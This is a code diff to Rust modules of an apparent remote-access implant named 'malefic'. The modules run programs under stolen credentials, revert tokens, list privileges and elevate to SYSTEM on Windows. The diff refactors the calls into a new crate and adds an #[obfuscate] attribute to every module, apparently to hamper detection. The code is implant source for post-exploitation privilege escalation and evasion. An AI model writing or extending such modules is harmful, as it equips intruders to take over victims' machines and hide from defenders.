@@ -1,5 +1,5 @@
-use malefic_proto::proto::implantpb::spite::Body::ExecResponse;
 use crate::prelude::*;
+use malefic_proto::proto::implantpb::spite::Body::ExecResponse;
 
 pub struct RunAs {}
 
@@ -8,6 +8,7 @@ pub struct RunAs {}
 impl Module for RunAs {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for RunAs {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::RunasRequest)?;
@@ -19,14 +20,20 @@ impl ModuleImpl for RunAs {
         let args = check_field!(req.args)?;
 
         let mut exec_response = malefic_proto::proto::modulepb::ExecResponse::default();
-        exec_response.stdout = malefic_helper::win::token::run_as(&username, &domain, &password, &program, &args, req.netonly, req.use_profile, req.use_env)?.into_bytes();
-        Ok(TaskResult::new_with_body(
-            id,
-            ExecResponse(exec_response),
-        ))
+        exec_response.stdout = malefic_os_win::token::run_as(
+            &username,
+            &domain,
+            &password,
+            &program,
+            &args,
+            req.netonly,
+            req.use_profile,
+            req.use_env,
+        )?
+        .into_bytes();
+        Ok(TaskResult::new_with_body(id, ExecResponse(exec_response)))
     }
 }
-
 
 pub struct Rev2Self {}
 
@@ -34,11 +41,11 @@ pub struct Rev2Self {}
 #[module_impl("rev2self")]
 impl Module for Rev2Self {}
 
-
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for Rev2Self {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
-        malefic_helper::win::token::revert_to_self()?;
+        malefic_os_win::token::revert_to_self()?;
         Ok(TaskResult::new(id))
     }
 }
@@ -49,9 +56,10 @@ pub struct GetPriv {}
 #[module_impl("privs")]
 impl Module for GetPriv {}
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for GetPriv {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
-        let privileges = malefic_helper::win::token::get_privs()?;
+        let privileges = malefic_os_win::token::get_privs()?;
 
         let mut response = malefic_proto::proto::modulepb::Response::default();
 
@@ -63,7 +71,6 @@ impl ModuleImpl for GetPriv {
     }
 }
 
-
 pub struct GetSystem {}
 
 #[async_trait]
@@ -71,10 +78,11 @@ pub struct GetSystem {}
 impl Module for GetSystem {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for GetSystem {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
-        // 尝试提升到 SYSTEM 权限
-        let _system_token = malefic_helper::win::token::get_system()?;
+        // Attempt to elevate to SYSTEM privileges
+        let _system_token = malefic_os_win::token::get_system()?;
 
         let mut response = malefic_proto::proto::modulepb::Response::default();
         response.output = "Successfully elevated to SYSTEM privileges".to_string();
